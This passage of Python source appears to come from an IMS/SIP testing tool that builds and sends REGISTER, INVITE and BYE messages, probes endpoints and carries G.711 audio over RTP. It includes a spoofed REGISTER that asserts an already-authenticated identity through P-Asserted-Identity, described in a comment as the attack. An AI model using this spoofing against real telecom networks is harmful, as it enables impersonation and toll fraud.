def _common_request(d, method, requires_contact):
    lines = ['%s sip:%s SIP/2.0' % (method, _bad_field('ruri', d['ruri']))]
    lines.append('Via: SIP/2.0/UDP %s:%s;branch=%s;rport'
                 % (_bad_field('host', d['host']), _bad_field('port', d['port']),
                    _bad_field('branch', d['branch'])))
    lines.append('Max-Forwards: 70')
    lines.append('From: %s;tag=%s' % (_addr(d['impi']), _bad_field('from_tag', d['from_tag'])))
    to = _addr(d.get('to_user') or d['impi'], d['to_tag'] or None)
    lines.append('To: %s' % to)
    lines.append('Call-ID: %s' % _bad_field('callid', d['callid']))
    lines.append('CSeq: %d %s' % (int(d['cseq']), method))
    if requires_contact:
        lines.append('Contact: <sip:%s>' % _bad_field('contact', d['contact']))
    return lines


def _authz_line(d, method, uri):
    """The Authorization header for a request answering a 401/407."""
    return ('Authorization: Digest username="%s", realm="%s", nonce="%s", '
            'uri="%s", response="%s", algorithm=%s, qop=%s, nc=%s, cnonce="%s"'
            % (_bad_field('user', d.get('user') or d['impi'].split('@')[0]),
               _bad_field('realm', d['realm']),
               _bad_field('nonce', d['nonce']),
               _bad_field('uri', d['uri']),
               _bad_field('response', d['response']),
               _bad_field('algorithm', d['algorithm']),
               _bad_field('qop', d['qop']),
               _bad_field('nc', d['nc']),
               _bad_field('cnonce', d['cnonce'])))


def render_sip(kind, d):
    """Return the message as bytes. No trailing diagnostics: this is wire."""
    if kind == 'register':
        lines = _common_request(d, 'REGISTER', True)
        lines[-1] += ';expires=%d' % int(d['expires'])
        lines.append('Expires: %d' % int(d['expires']))
        lines.append('User-Agent: %s' % _bad_field('user_agent', d['user_agent']))
        if d.get('pai'):
            # Only the spoofed REGISTER carries this, and only because the
            # claim it makes ("this identity is already authenticated") is the
            # attack. It is a header like any other: it goes before the
            # separator, and the separator is still the only thing between the
            # headers and the body.
            lines.append('P-Asserted-Identity: <sip:%s>'
                         % _bad_field('pai', d['pai']))
        body = ''
    elif kind == 'register-auth':
        lines = _common_request(d, 'REGISTER', True)
        lines[-1] += ';expires=%d' % int(d['expires'])
        lines.append('Expires: %d' % int(d['expires']))
        auth = ('Authorization: Digest username="%s", realm="%s", nonce="%s", '
                'uri="%s", response="%s", algorithm=%s, qop=%s, nc=%s, cnonce="%s"'
                % (_bad_field('impi', d['impi'].split('@')[0]),
                   _bad_field('realm', d['realm']),
                   _bad_field('nonce', d['nonce']),
                   _bad_field('uri', d['uri']),
                   _bad_field('response', d['response']),
                   _bad_field('algorithm', d['algorithm']),
                   _bad_field('qop', d['qop']),
                   _bad_field('nc', d['nc']),
                   _bad_field('cnonce', d['cnonce'])))
        lines.append(auth)
        lines.append('User-Agent: %s' % _bad_field('user_agent', d['user_agent']))
        body = ''
    elif kind == 'challenge':
        # A 401 is a response: same Via/From/Call-ID/CSeq as the request it
        # answers, and the To header acquires the tag it did not have.
        lines = ['SIP/2.0 401 Unauthorized']
        lines.append('Via: SIP/2.0/UDP %s:%s;branch=%s;rport'
                     % (_bad_field('host', d['host']), _bad_field('port', d['port']),
                        _bad_field('branch', d['branch'])))
        lines.append('From: %s;tag=%s' % (_addr(d['impi']), _bad_field('from_tag', d['from_tag'])))
        lines.append('To: %s;tag=%s' % (_addr(d['impi']), _bad_field('to_tag', d['to_tag'] or _rand(4))))
        lines.append('Call-ID: %s' % _bad_field('callid', d['callid']))
        lines.append('CSeq: %d REGISTER' % int(d['cseq']))
        lines.append('WWW-Authenticate: Digest realm="%s", nonce="%s", algorithm=%s, qop="%s"'
                     % (_bad_field('realm', d['realm']), _bad_field('nonce', d['nonce']),
                        _bad_field('algorithm', d['algorithm']),
                        _bad_field('qop', d['qop'])))
        body = ''
    elif kind in ('invite', 'invite-auth'):
        lines = _common_request(d, 'INVITE', True)
        if kind == 'invite-auth':
            lines.append(_authz_line(d, 'INVITE', d['ruri']))
        lines.append('Content-Type: application/sdp')
        rtp = d.get('rtp_port', '49152')
        ip = d.get('media_ip', d['host'])
        # PCMU and PCMA first because this leg can speak them; AMR last because
        # an IMS core expects to see it offered. If the answer picks AMR the
        # call still connects and the media is reported unsupported rather
        # than silently mute.
        body = ('v=0\r\n'
                'o=imsisting 1 1 IN IP4 %s\r\n'
                's=IMSIsting\r\n'
                'c=IN IP4 %s\r\n'
                't=0 0\r\n'
                'm=audio %s RTP/AVP 0 8 96\r\n'
                'a=rtpmap:0 PCMU/8000\r\n'
                'a=rtpmap:8 PCMA/8000\r\n'
                'a=rtpmap:96 AMR/8000\r\n'
                'a=fmtp:96 mode-set=0,1,2,3,4,5,6,7\r\n'
                'a=ptime:%d\r\n'
                'a=sendrecv\r\n'
                % (_bad_field('host', ip), _bad_field('host', ip),
                   _bad_field('rtp_port', rtp), RTP_PTIME_MS))
    elif kind == 'ack':
        # A 2xx ACK: its own transaction, the CSeq number of the INVITE it
        # acknowledges, no Contact and no response.
        lines = _common_request(d, 'ACK', False)
        body = ''
    elif kind in ('bye', 'bye-auth'):
        lines = _common_request(d, 'BYE', False)
        if kind == 'bye-auth':
            lines.append(_authz_line(d, 'BYE', d['ruri']))
        body = ''
    else:
        raise SipError('unknown message kind %r (want register, register-auth, '
                       'challenge, invite, ack or bye)' % kind)

    body_bytes = body.encode('utf-8')
    lines.append('Content-Length: %d' % len(body_bytes))
    head = '\r\n'.join(lines) + '\r\n\r\n'
    return head.encode('utf-8') + body_bytes


def cmd_sipbuild(argv):
    if not argv:
        raise SystemExit('ERROR\tusage: sipbuild <kind> [key=value ...]')
    kind = argv[0]
    opt = {}
    for a in argv[1:]:
        if '=' not in a:
            raise SystemExit('ERROR\targument %r is not key=value' % a)
        k, v = a.split('=', 1)
        opt[k] = v
    try:
        msg = render_sip(kind, _sip_defaults(kind, opt))
    except SipError as exc:
        print('ERROR\t%s' % exc, file=sys.stderr)
        return 2
    except ValueError as exc:
        print('ERROR\t%s' % exc, file=sys.stderr)
        return 2
    sys.stdout.buffer.write(msg)
    sys.stdout.buffer.flush()
    return 0


def cmd_sipsend(argv):
    """Build the message and put it on the wire. The send is the point."""
    if len(argv) < 3:
        raise SystemExit('ERROR\tusage: sipsend <host> <port> <kind> [key=value ...]')
    host, port, kind = argv[0], argv[1], argv[2]
    opt = {}
    for a in argv[3:]:
        if '=' not in a:
            raise SystemExit('ERROR\targument %r is not key=value' % a)
        k, v = a.split('=', 1)
        opt[k] = v
    try:
        msg = render_sip(kind, _sip_defaults(kind, opt))
    except (SipError, ValueError) as exc:
        print('ERROR\t%s' % exc, file=sys.stderr)
        return 2
    try:
        portn = int(port)
    except ValueError:
        print('ERROR\tport must be a number', file=sys.stderr)
        return 2
    if not 0 < portn < 65536:
        print('ERROR\tport %d is outside 1..65535' % portn, file=sys.stderr)
        return 2
    timeout = float(os.environ.get('VIMS_SIP_TIMEOUT', '2') or '2')
    try:
        fam, typ, proto, _, addr = socket.getaddrinfo(
            host, portn, 0, socket.SOCK_DGRAM)[0]
    except socket.gaierror as exc:
        print('ERROR\tcannot resolve %s: %s' % (host, exc), file=sys.stderr)
        return 1
    s = socket.socket(fam, typ, proto)
    s.settimeout(timeout)
    try:
        s.sendto(msg, addr)
    except OSError as exc:
        print('ERROR\tsend to %s:%d failed: %s' % (host, portn, exc), file=sys.stderr)
        s.close()
        return 1
    print('message_kind\t%s' % kind)
    print('sent_bytes\t%d' % len(msg))
    print('dst\t%s:%d' % (host, portn))
    try:
        data, peer = s.recvfrom(65535)
    except socket.timeout:
        data, peer = b'', None
    except OSError as exc:
        data, peer = b'', None
        print('recv_error\t%s' % exc)
    s.close()
    if data:
        print('response_bytes\t%d' % len(data))
        print('response_from\t%s:%d' % (peer[0], peer[1]))
        print('response_line\t%s'
              % data.split(b'\r\n', 1)[0].decode('utf-8', 'replace'))
        print('response_hex\t%s' % data[:64].hex())
        print('status\tanswered')
    else:
        print('response_bytes\t0')
        print('status\tsent-no-answer')
    return 0


def _sip_head(data):
    """Split a SIP message into status line, header map and body."""
    text = data.decode('utf-8', 'replace')
    head, _, body = text.partition('\r\n\r\n')
    lines = head.split('\r\n')
    hdrs = {}
    for ln in lines[1:]:
        k, sep, v = ln.partition(':')
        if sep:
            hdrs.setdefault(k.strip().lower(), []).append(v.strip())
    return lines[0], hdrs, body


def _digest_challenge(value):
    scheme, _, rest = value.partition(' ')
    params = {}
    for part in rest.split(','):
        k, sep, v = part.strip().partition('=')
        if sep:
            params[k.strip().lower()] = v.strip().strip('"')
    return scheme.strip().lower(), params


def _qop_chosen(params):
    offered = [q.strip() for q in params.get('qop', '').split(',') if q.strip()]
    if not offered:
        return ''
    for want in ('auth', 'auth-int'):
        if want in offered:
            return want
    return offered[0]


def digest_response(user, realm, password, method, uri, nonce, nc, cnonce, qop):
    """RFC 2617 3.2.2.1 response, with password as bytes."""
    ha1 = hashlib.md5(user.encode() + b':' + realm.encode()
                      + b':' + password).hexdigest()
    ha2 = hashlib.md5(('%s:%s' % (method, uri)).encode()).hexdigest()
    if qop:
        return hashlib.md5(('%s:%s:%s:%s:%s:%s'
                            % (ha1, nonce, nc, cnonce, qop, ha2)).encode()).hexdigest()
    return hashlib.md5(('%s:%s:%s' % (ha1, nonce, ha2)).encode()).hexdigest()


# ══════════════════════════════════════════════════════════════════════
# The media leg: G.711, RTP, and the two directions of a call's audio.
#
# Signalling alone rings a phone and then says nothing. This block carries the
# audio: PCMU/PCMA (G.711) both ways at 8 kHz, 20 ms frames, one UDP socket on
# the port the SDP advertised. It is deliberately not a jitter buffer or an
# echo canceller — it is the smallest thing that makes a call audible.
#
# G.711 is the Sun reference implementation of g711.c (linear2ulaw and friends),
# which is the table pair every other implementation is checked against. AMR is
# offered in the SDP because an IMS core expects it, and refused by name when
# the answer picks it: this leg cannot decode AMR, and pretending otherwise
# would be silence with a success row on top.
# ══════════════════════════════════════════════════════════════════════
A_ENDS = (0x1F, 0x3F, 0x7F, 0xFF, 0x1FF, 0x3FF, 0x7FF, 0xFFF)
U_ENDS = (0x3F, 0x7F, 0xFF, 0x1FF, 0x3FF, 0x7FF, 0xFFF, 0x1FFF)
G711_BIAS = 0x84
G711_CLIP_U = 8159


def _g711_seg(v, ends):
    for i, e in enumerate(ends):
        if v <= e:
            return i
    return 8


def ulaw_encode(s):
    s = int(s) >> 2
    if s < 0:
        s = -s
        mask = 0x7F
    else:
        mask = 0xFF
    if s > G711_CLIP_U:
        s = G711_CLIP_U
    s += G711_BIAS >> 2
    seg = _g711_seg(s, U_ENDS)
    if seg >= 8:
        return 0x7F ^ mask
    return ((seg << 4) | ((s >> (seg + 1)) & 0xF)) ^ mask


def ulaw_decode(u):
    u = (~u) & 0xFF
    t = ((u & 0xF) << 3) + G711_BIAS
    t <<= (u & 0x70) >> 4
    return (G711_BIAS - t) if (u & 0x80) else (t - G711_BIAS)


def alaw_encode(s):
    s = int(s) >> 3
    if s >= 0:
        mask = 0xD5
    else:
        mask = 0x55
        s = -s - 1
    seg = _g711_seg(s, A_ENDS)
    if seg >= 8:
        return 0x7F ^ mask
    a = seg << 4
    a |= ((s >> 1) & 0xF) if seg < 2 else ((s >> seg) & 0xF)
    return a ^ mask


def alaw_decode(a):
    a ^= 0x55
    t = (a & 0xF) << 4
    seg = (a & 0x70) >> 4
    if seg == 0:
        t += 8
    elif seg == 1:
        t += 0x108
    else:
        t = (t + 0x108) << (seg - 1)
    return t if (a & 0x80) else -t


# payload type, name, encoder, decoder. The two static types are the ones a
# plain SIP endpoint answers with (RFC 3551 4.5.14): 0 is PCMU, 8 is PCMA.
G711 = {
    'PCMU': (0, 'PCMU/8000', ulaw_encode, ulaw_decode),
    'PCMA': (8, 'PCMA/8000', alaw_encode, alaw_decode),
}

RTP_PTIME_MS = 20
RTP_SAMPLES = 8 * RTP_PTIME_MS          # 160 samples per frame
RTP_FRAME_BYTES = 2 * RTP_SAMPLES       # 320 bytes of s16le


def rtp_packet(pt, seq, ts, ssrc, payload):
    return struct.pack('>BBHII', 0x80, pt & 0x7F, seq & 0xFFFF,
                       ts & 0xFFFFFFFF, ssrc & 0xFFFFFFFF) + payload


def rtp_parse(buf):
    """(header, payload) or None. Header extensions and padding are honoured."""
    if len(buf) < 12:
        return None
    b0, b1, seq, ts, ssrc = struct.unpack('>BBHII', buf[:12])
    if (b0 >> 6) != 2:
        return None
    off = 12 + 4 * (b0 & 0x0F)
    if b0 & 0x10:
        if len(buf) < off + 4:
            return None
        off += 4 + 4 * struct.unpack('>H', buf[off + 2:off + 4])[0]
    if off > len(buf):
        return None
    body = buf[off:]
    if b0 & 0x20 and body:
        body = body[:-body[-1]] if body[-1] else b''
    return ({'pt': b1 & 0x7F, 'marker': bool(b1 & 0x80), 'seq': seq,
             'ts': ts, 'ssrc': ssrc}, body)


def sdp_parse(body):
    """What an ANSWER tells us about where to send audio and in what shape."""
    out = {'port': 0, 'conn': '', 'pts': [], 'rtpmap': {}, 'ptime': ''}
    for line in body.replace('\r\n', '\n').split('\n'):
        if line.startswith('c=IN IP'):
            out['conn'] = line.split()[-1]
        elif line.startswith('m=audio'):
            f = line.split()
            if len(f) > 1:
                out['port'] = int(f[1].split('/')[0] or 0)
            out['pts'] = f[3:]
        elif line.startswith('a=rtpmap:'):
            pt, _, rest = line[len('a=rtpmap:'):].partition(' ')
            out['rtpmap'][pt.strip()] = rest.strip()
        elif line.startswith('a=ptime:'):
            out['ptime'] = line[len('a=ptime:'):].strip()
    return out


def sdp_choose_codec(sdp, want):
    """-> (pt, codec-name) for a codec this leg can actually speak."""
    for name, (static_pt, rtpmap_name, _e, _d) in G711.items():
        if want and name != want:
            continue
        if str(static_pt) in sdp['pts']:
            return static_pt, name
        for pt, rm in sdp['rtpmap'].items():
            if rm.lower().startswith(rtpmap_name.lower().split('/')[0]):
                return int(pt), name
    return None, (sdp['rtpmap'].get(sdp['pts'][0], '?') if sdp['pts'] else '?')


class AudioSource:
    """320 bytes of 8 kHz s16le per frame, or None at the end of a file."""

    def __init__(self, spec):
        self.spec = spec
        self.kind, _, self.arg = spec.partition(':')
        self.proc = None
        self.wav = None
        if self.kind == 'mic':
            exe = shutil.which('arecord')
            if not exe:
                raise MediaError('--media mic needs arecord (alsa-utils); '
                                 'pass media=wav:<file> or media=none')
            self.proc = subprocess.Popen(
                [exe, '-q', '-f', 'S16_LE', '-r', '8000', '-c', '1', '-t', 'raw'],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        elif self.kind == 'wav':
            if not self.arg:
                raise MediaError('media=wav: needs a file path')
            try:
                self.wav = wave.open(self.arg, 'rb')
            except (OSError, wave.Error) as exc:
                raise MediaError('cannot open %s: %s' % (self.arg, exc))
            if (self.wav.getframerate() != 8000 or self.wav.getnchannels() != 1
                    or self.wav.getsampwidth() != 2):
                raise MediaError(
                    '%s is %d Hz, %d channel(s), %d byte samples; this leg sends '
                    '8000 Hz mono 16-bit only'
                    % (self.arg, self.wav.getframerate(),
                       self.wav.getnchannels(), self.wav.getsampwidth()))
        elif self.kind not in ('silence', 'none'):
            raise MediaError('media source %r is not mic, wav:<file>, silence '
                             'or none' % spec)

    def read(self, nbytes):
        if self.kind == 'mic':
            return self.proc.stdout.read(nbytes)
        if self.kind == 'wav':
            data = self.wav.readframes(RTP_SAMPLES)
            if not data:                      # loop the clip: a test tone should
                self.wav.rewind()             # not stop mid-call
                data = self.wav.readframes(RTP_SAMPLES)
            return data
        return b'\x00' * nbytes

    def close(self):
        if self.proc is not None:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=2)
            except Exception:
                pass
        if self.wav is not None:
            self.wav.close()


class AudioSink:
    """Plays the far end, or records it, or counts it and drops it."""

    def __init__(self, play, record):
        self.proc = None
        self.wav = None
        self.dropped = 0
        if play:
            exe = shutil.which('aplay')
            if not exe:
                raise MediaError('--play needs aplay (alsa-utils)')
            self.proc = subprocess.Popen(
                [exe, '-q', '-f', 'S16_LE', '-r', '8000', '-c', '1', '-t', 'raw'],
                stdin=subprocess.PIPE, stderr=subprocess.DEVNULL)
        if record:
            self.wav = wave.open(record, 'wb')
            self.wav.setnchannels(1)
            self.wav.setsampwidth(2)
            self.wav.setframerate(8000)

    def write(self, pcm):
        if self.proc is not None:
            try:
                self.proc.stdin.write(pcm)
                self.proc.stdin.flush()
            except (BrokenPipeError, ValueError):
                self.dropped += len(pcm)
        if self.wav is not None:
            self.wav.writeframes(pcm)

    def close(self):
        if self.proc is not None:
            try:
                self.proc.stdin.close()
                self.proc.wait(timeout=2)
            except Exception:
                pass
        if self.wav is not None:
            self.wav.close()


class MediaLeg:
    """One RTP socket, one sender thread, one receiver thread, and counters.

    The socket is bound BEFORE the INVITE so the port in the SDP is a port that
    is actually listening. Advertising a port nobody holds is how a call
    connects and stays silent.
    """

    def __init__(self, codec, source, play, record, port):
        if codec not in G711:
            raise MediaError('codec %r is not PCMU or PCMA' % codec)
        self.codec = codec
        self.pt, self.rtpmap_name, self.encode, self.decode = G711[codec]
        self.source_spec = source
        self.play = play
        self.record = record
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            self.sock.bind(('', int(port)))
        except OSError as exc:
            raise MediaError('cannot bind RTP port %s: %s' % (port, exc))
        self.port = self.sock.getsockname()[1]
        self.sock.settimeout(0.2)
        self.ssrc = struct.unpack('>I', os.urandom(4))[0]
        self.seq = int(self.ssrc & 0xFFFF)
        self.ts = int(self.ssrc >> 7) & 0xFFFFFFFF
        self.remote = None
        self.stop = threading.Event()
        self.src = None
        self.sink = None
        self.threads = []
        self.closed = False
        self.st = {'sent': 0, 'recv': 0, 'bytes_out': 0, 'bytes_in': 0,
                   'bad': 0, 'other_pt': 0, 'first_seq': None,
                   'last_seq': None, 'highest_seq': None, 'jitter': 0.0,
                   'last_transit': None}

    def attach(self, ip, port, pt=None):
        if pt is not None:
            self.pt = pt
        self.remote = (ip, int(port))

    def start(self):
        if self.remote is None:
            raise MediaError('the media leg has no remote address yet')
        self.src = AudioSource(self.source_spec)
        self.sink = AudioSink(self.play, self.record)
        self.threads = [threading.Thread(target=self._send, daemon=True),
                        threading.Thread(target=self._recv, daemon=True)]
        for t in self.threads:
            t.start()

    def _send(self):
        deadline = time.monotonic()
        paced = self.src.kind != 'mic'      # arecord paces itself
        first = True
        while not self.stop.is_set():
            try:
                raw = self.src.read(RTP_FRAME_BYTES)
            except (OSError, ValueError):
                break
            if not raw:
                if first and self.src.kind == 'mic':
                    # arecord dies when there is no capture device, and a
                    # silent call with a success row on top is the exact lie
                    # this module refuses to tell.
                    print('ERROR\tarecord produced no audio: is there a capture '
                          'device? (arecord -l)', file=sys.stderr)
                break
            first = False
            if len(raw) < RTP_FRAME_BYTES:
                raw = raw + b'\x00' * (RTP_FRAME_BYTES - len(raw))
            pcm = struct.unpack('<%dh' % RTP_SAMPLES, raw)
            pkt = rtp_packet(self.pt, self.seq, self.ts, self.ssrc,
                             bytes(self.encode(s) for s in pcm))
            try:
                self.sock.sendto(pkt, self.remote)
            except OSError:
                break
            self.st['sent'] += 1
            self.st['bytes_out'] += len(pkt)
            self.seq = (self.seq + 1) & 0xFFFF
            self.ts = (self.ts + RTP_SAMPLES) & 0xFFFFFFFF
            if paced:
                deadline += RTP_PTIME_MS / 1000.0
                wait = deadline - time.monotonic()
                if wait > 0:
                    self.stop.wait(wait)

    def _recv(self):
        while not self.stop.is_set():
            try:
                buf, _peer = self.sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            now = time.monotonic()
            parsed = rtp_parse(buf)
            if parsed is None:
                self.st['bad'] += 1
                continue
            hdr, payload = parsed
            self.st['recv'] += 1
            self.st['bytes_in'] += len(buf)
            if self.st['first_seq'] is None:
                self.st['first_seq'] = hdr['seq']
            if (self.st['highest_seq'] is None
                    or (hdr['seq'] - self.st['highest_seq']) & 0xFFFF < 0x8000):
                self.st['highest_seq'] = hdr['seq']
            self.st['last_seq'] = hdr['seq']
            # RFC 3550 A.8: interarrival jitter from transit times.
            transit = now * 1000.0 - hdr['ts'] * 1000.0 / 8000.0
            if self.st['last_transit'] is not None:
                d = abs(transit - self.st['last_transit'])
                self.st['jitter'] += (d - self.st['jitter']) / 16.0
            self.st['last_transit'] = transit
            if hdr['pt'] != self.pt:
                self.st['other_pt'] += 1
                continue
            if self.sink is not None and payload:
                pcm = struct.pack('<%dh' % len(payload),
                                  *[self.decode(b) for b in payload])
                self.sink.write(pcm)

    def run(self, duration):
        """Talk for `duration` seconds; 0 means until interrupted."""
        deadline = time.monotonic() + duration if duration else None
        try:
            while not self.stop.is_set():
                if deadline is not None and time.monotonic() >= deadline:
                    break
                self.stop.wait(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            self.shutdown()

    def shutdown(self):
        if self.closed:
            return
        self.closed = True
        self.stop.set()
        for t in self.threads:
            t.join(timeout=2)
        if self.src is not None:
            self.src.close()
        if self.sink is not None:
            self.sink.close()
        self.sock.close()

    def stats(self):
        st = self.st
        expected = 0
        lost = 0
        if st['first_seq'] is not None:
            expected = ((st['highest_seq'] - st['first_seq']) & 0xFFFF) + 1
            lost = max(0, expected - st['recv'])
        return [
            ('rtp_codec', self.rtpmap_name),
            ('rtp_local_port', self.port),
            ('rtp_remote', '%s:%s' % (self.remote if self.remote else ('-', '-'))),
            ('rtp_sent', st['sent']),
            ('rtp_recv', st['recv']),
            ('rtp_lost', lost),
            ('rtp_loss_percent', '%.2f' % (100.0 * lost / expected) if expected else '0.00'),
            ('rtp_jitter_ms', '%.2f' % st['jitter']),
            ('rtp_bad_packets', st['bad']),
            ('rtp_other_payload', st['other_pt']),
            ('rtp_bytes_out', st['bytes_out']),
            ('rtp_bytes_in', st['bytes_in']),
        ]


class MediaError(Exception):
    pass


def cmd_g711(argv):
    """Encode or decode a hex sample stream, so the tables can be checked."""
    if len(argv) < 3:
        raise SystemExit('ERROR\tusage: g711 <PCMU|PCMA> encode|decode <hex>')
    codec, direction, hexin = argv[0].upper(), argv[1], argv[2]
    if codec not in G711:
        print('ERROR\tcodec must be PCMU or PCMA, not %r' % codec, file=sys.stderr)
        return 2
    _pt, name, enc, dec = G711[codec]
    try:
        raw = bytes.fromhex(hexin)
    except ValueError:
        print('ERROR\tnot hex: %r' % hexin, file=sys.stderr)
        return 2
    print('codec\t%s' % name)
    print('direction\t%s' % direction)
    if direction == 'encode':
        if len(raw) % 2:
            print('ERROR\tencode takes 16-bit samples, so an even octet count',
                  file=sys.stderr)
            return 2
        pcm = struct.unpack('<%dh' % (len(raw) // 2), raw)
        print('out\t%s' % bytes(enc(s) for s in pcm).hex())
        return 0
    if direction == 'decode':
        print('out\t%s' % struct.pack('<%dh' % len(raw),
                                      *[dec(b) for b in raw]).hex())
        return 0
    print('ERROR\tdirection must be encode or decode', file=sys.stderr)
    return 2


def cmd_sipprobe(argv):
    """Ask a SIP endpoint whether it is there, before blaming the call.

    OPTIONS is the method RFC 3261 11.1 defines for exactly this: it changes
    nothing and any live UA answers it. A phone that rings nothing is usually
    a phone with no client listening on that port, and saying which it is
    saves an afternoon of suspecting the wrong end.
    """
    if not argv:
        raise SystemExit('ERROR\tusage: sipprobe <host> <port> [to=...]')
    host, port = argv[0], argv[1]
    opt = {}
    for a in argv[2:]:
        if '=' in a:
            k, v = a.split('=', 1)
            opt[k] = v
    try:
        portn = int(port)
    except ValueError:
        print('ERROR\tport must be a number', file=sys.stderr)
        return 2
    timeout = float(os.environ.get('VIMS_SIP_TIMEOUT', '2') or '2')
    try:
        fam, typ, proto, _, addr = socket.getaddrinfo(host, portn, 0,
                                                      socket.SOCK_DGRAM)[0]
    except socket.gaierror as exc:
        print('ERROR\tcannot resolve %s: %s' % (host, exc), file=sys.stderr)
        return 1
    s = socket.socket(fam, typ, proto)
    try:
        s.bind(('', 0))
    except OSError as exc:
        print('ERROR\tcannot bind a local port: %s' % exc, file=sys.stderr)
        return 1
    s.settimeout(timeout)
    user = opt.get('user') or 'imsisting'
    target = opt.get('to') or ('sip:%s@%s' % (user, host))
    branch = 'z9hG4bK' + _rand(6)
    callid = _rand(8) + '@' + host
    contact = 'sip:%s@%s:%d' % (user, host, s.getsockname()[1])
    msg = ('OPTIONS %s SIP/2.0\r\n'
           'Via: SIP/2.0/UDP %s:%d;branch=%s;rport\r\n'
           'Max-Forwards: 70\r\n'
           'From: <sip:%s@%s>;tag=%s\r\n'
           'To: <%s>\r\n'
           'Call-ID: %s\r\n'
           'CSeq: 1 OPTIONS\r\n'
           'Contact: <%s>\r\n'
           'User-Agent: IMSIsting\r\n'
           'Content-Length: 0\r\n\r\n'
           % (target, host, s.getsockname()[1], branch, user, host, _rand(4),
              target, callid, contact)).encode()
    print('probe\toptions\t%s' % target)
    try:
        s.sendto(msg, addr)
        print('sent_bytes\t%d' % len(msg))
    except OSError as exc:
        print('reachable\tno')
        print('ERROR\tsend to %s:%d failed: %s' % (host, portn, exc),
              file=sys.stderr)
        return 1
    try:
        data, peer = s.recvfrom(65535)
    except socket.timeout:
        print('reachable\tno')
        print('answered\tnothing in %.1fs' % timeout)
        print('WHY\tno SIP UA replied on that port: check the client is running,\n'
              'WHY\tdirect-IP calls are allowed, and the firewall on the phone\n'
              'WHY\tpermits UDP to it' , file=sys.stderr)
        print('limitation\ta silent UDP endpoint and a closed one look the same '
              'from here; only an ICMP port-unreachable tells them apart')
        s.close()
        return 3
    except OSError as exc:
        print('reachable\tno')
        print('ERROR\treceive failed: %s' % exc, file=sys.stderr)
        s.close()
        return 1
    s.close()
    line = data.decode('utf-8', 'replace').split('\r\n', 1)[0]
    print('reachable\tyes')
    print('answered\t%s' % line)
    print('from\t%s:%d' % (peer[0], peer[1]))
    parts = line.split(' ')
    print('sip_status\t%s' % (parts[1] if len(parts) > 1 else '?'))
    return 0


def cmd_callflow(argv):
    """Place a call, and keep the dialog consistent while doing it.

    A REGISTER is one transaction; a call is a dialog. The same Call-ID and
    From tag go out on every request, each transaction gets a new branch and
    the next CSeq, the To tag is the one the answer assigned, the ACK is
    addressed to the Contact the answer named, and the BYE reuses the dialog
    the INVITE opened. Building those bytes one message at a time is how a
    dialog gets its CSeq or its To tag wrong, so the state lives here.
    """
    if len(argv) < 2:
        raise SystemExit('ERROR\tusage: callflow <host> <port> [key=value ...]')
    host, port = argv[0], argv[1]
    opt = {}
    for a in argv[2:]:
        if '=' not in a:
            raise SystemExit('ERROR\targument %r is not key=value' % a)
        k, v = a.split('=', 1)
        opt[k] = v
    try:
        portn = int(port)
    except ValueError:
        print('ERROR\tport must be a number', file=sys.stderr)
        return 2
    if not 0 < portn < 65536:
        print('ERROR\tport %d is outside 1..65535' % portn, file=sys.stderr)
        return 2
    # Media options. media=none is the old behaviour: ring, then say nothing.
    media_spec = opt.get('media', 'none')
    media_codec = (opt.get('codec') or 'PCMU').upper()
    media_play = opt.get('play', '0') not in ('0', '', 'no', 'off')
    media_record = opt.get('record', '')
    talk_seconds = float(opt.get('duration', '0') or '0')
    media = None
    if media_spec not in ('none', ''):
        if media_codec not in G711:
            print('ERROR\tcodec %r is not PCMU or PCMA — this leg has no AMR'
                  % media_codec, file=sys.stderr)
            return 2
    timeout = float(os.environ.get('VIMS_SIP_TIMEOUT', opt.get('timeout', '2')) or '2')
    try:
        fam, typ, proto, _, addr = socket.getaddrinfo(
            host, portn, 0, socket.SOCK_DGRAM)[0]
    except socket.gaierror as exc:
        print('ERROR\tcannot resolve %s: %s' % (host, exc), file=sys.stderr)
        return 1
    sock = socket.socket(fam, typ, proto)
    # Bind before sending: the Contact header has to name a port that answers,
    # and an unbound socket's port is only known after the first send. A phone
    # that hangs up sends its BYE to that Contact, so a wrong one strands the
    # call until a timeout tears it down.
    try:
        sock.bind(('', 0))
    except OSError as exc:
        print('ERROR\tcannot bind a local SIP port: %s' % exc, file=sys.stderr)
        return 1
    sock.settimeout(timeout)
    sip_port = sock.getsockname()[1]
    # The address the far end can reach us on: ask the routing table, which is
    # the interface that actually reaches them.
    local_ip = None
    _probe = socket.socket(fam, typ, proto)
    try:
        _probe.connect(addr)
        local_ip = _probe.getsockname()[0]
    except OSError:
        pass
    finally:
        _probe.close()

    if media_spec not in ('none', ''):
        try:
            # Bind before the INVITE: the port in the SDP has to be a port that
            # is listening, or the call connects into silence.
            media = MediaLeg(media_codec, media_spec, media_play, media_record,
                             opt.get('rtp_port', '0'))
            opt['rtp_port'] = str(media.port)
        except MediaError as exc:
            print('ERROR\t%s' % exc, file=sys.stderr)
            return 2
        # The SDP has to name an address the far end can reach US on. Defaulting
        # it to the far end's own address (which is what the signalling builder
        # does) makes the phone send audio to itself.
        if 'media_ip' not in opt and local_ip:
            opt['media_ip'] = local_ip
        print('media\t%s\tport=%d\tcodec=%s\tip=%s'
              % (media_spec, media.port, media.rtpmap_name,
                 opt.get('media_ip', opt.get('host'))))

    impi = opt.get('impi') or '310150123456789@ims.mnc001.mcc310.3gppnetwork.org'
    domain = opt.get('domain') or 'ims.mnc001.mcc310.3gppnetwork.org'
    to_user = opt.get('to') or opt.get('to_user') or '310150987654321@' + domain
    auth_mode = opt.get('auth', 'none')
    user = opt.get('user') or impi.split('@')[0]
    secret = opt.get('password', '')
    res_hex = opt.get('res', '')
    enc = opt.get('encoding', 'hex')
    base = {'host': host, 'port': str(portn), 'impi': impi, 'to_user': to_user,
            'user': user, 'ruri': opt.get('ruri') or domain,
            'domain': domain, 'realm': opt.get('realm') or domain,
            'callid': opt.get('callid') or (_rand(8) + '@' + _rand(2)),
            'from_tag': opt.get('from_tag') or _rand(4),
            # Contact names US, so it carries our address and our SIP port,
            # not the far end's: a default built from `host` tells the phone to
            # send its in-dialog requests to itself.
            'contact': opt.get('contact') or ('%s@%s:%d'
                                              % (impi.split('@')[0],
                                                 local_ip or host, sip_port)),
            'to_tag': ''}
    state = {'cseq': int(opt.get('cseq', '1'))}

    def build(kind, **over):
